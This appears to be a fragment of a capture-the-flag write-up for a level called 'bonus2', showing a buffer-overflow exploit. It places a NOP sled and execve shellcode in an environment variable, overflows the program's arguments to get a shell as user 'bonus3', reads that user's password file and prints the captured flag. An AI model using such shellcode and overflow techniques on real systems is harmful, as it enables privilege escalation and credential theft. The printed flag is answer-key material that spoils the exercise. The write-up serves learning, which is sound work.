We implement a environment variable `EXPLOIT` with a shellcode :
```bash
export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
```

We fill `argv[1]` with our `EXPLOIT` address and we insert a padding in `argv[2]` :
```bash
./bonus2 $(python -c "print '\x04\xf8\xff\xbf' * 100") $(python -c "print 'B' * 26")
$ whoami
bonus3
$ cd .. && cat bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```